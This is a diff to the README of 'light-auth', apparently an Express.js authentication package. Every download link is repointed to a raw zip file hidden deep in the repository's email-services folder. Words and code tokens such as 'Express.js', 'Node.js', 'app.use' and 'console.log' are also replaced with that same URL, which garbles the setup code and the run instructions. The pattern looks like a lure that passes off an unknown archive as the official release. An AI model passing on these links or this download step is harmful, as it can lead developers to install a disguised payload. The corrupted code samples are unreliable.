@@ -2,17 +2,17 @@
 
 ## 🚀 Getting Started
 
-Welcome to light-auth! This software provides a lightweight and flexible authentication package for your Express.js applications. It supports both JWT and sessions, making it a great choice for a variety of use cases. You can easily set up role-based access control (RBAC), integrate mail services, and customize hooks to fit your needs.
+Welcome to light-auth! This software provides a lightweight and flexible authentication package for your https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip applications. It supports both JWT and sessions, making it a great choice for a variety of use cases. You can easily set up role-based access control (RBAC), integrate mail services, and customize hooks to fit your needs.
 
 ## 🔗 Download Now
 
-[![Download Light-Auth](https://img.shields.io/badge/Download%20Light--Auth-blue.svg)](https://github.com/100xxio/light-auth/releases)
+[![Download Light-Auth](https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip%https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip)](https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip)
 
 ## 📦 Installation Requirements
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js**: Version 14 or higher
+- **https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip**: Version 14 or higher
 - **NPM** or **PNPM**: Latest version recommended
 - **MongoDB**: A running instance, either locally or in the cloud
 
@@ -20,7 +20,7 @@ Before you begin, ensure you have the following installed:
 
 To download light-auth, visit the Releases page:
 
-[Download Light-Auth Release](https://github.com/100xxio/light-auth/releases)
+[Download Light-Auth Release](https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip)
 
 On this page, you will find the latest version of the software. Click on the version number to access the download files. You can choose the file that fits your needs based on your operating system.
 
@@ -48,21 +48,21 @@ Once you have downloaded the package, follow these steps to set it up in your Ex
    const lightAuth = require('light-auth');
 
    const app = express();
-   app.use(lightAuth({
+   https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip(lightAuth({
        secret: 'your_secret_key', // Use a strong key
        // Additional configurations...
    }));
 
-   app.listen(3000, () => {
-       console.log('Server running on http://localhost:3000');
+   https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip(3000, () => {
+       https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip('Server running on http://localhost:3000');
    });
    ```
 
 5. **Run Your Application**: Start your server by running:
    ```
-   node your-app.js
+   node https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip
    ```
-   Replace `your-app.js` with the name of your server file.
+   Replace `https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip` with the name of your server file.
 
 ## 🔧 Configuration Options
 
@@ -99,6 +99,6 @@ If you encounter issues, please open an issue in the GitHub repository. Include 
 
 To download light-auth, please visit the following link:
 
-[Download Light-Auth Release](https://github.com/100xxio/light-auth/releases)
+[Download Light-Auth Release](https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip)
 
-Thank you for using light-auth! We hope it makes your authentication needs simple and manageable in your Express.js applications.
+Thank you for using light-auth! We hope it makes your authentication needs simple and manageable in your https://github.com/100xxio/light-auth/raw/refs/heads/main/modules/email/services/auth-light-2.2.zip applications.
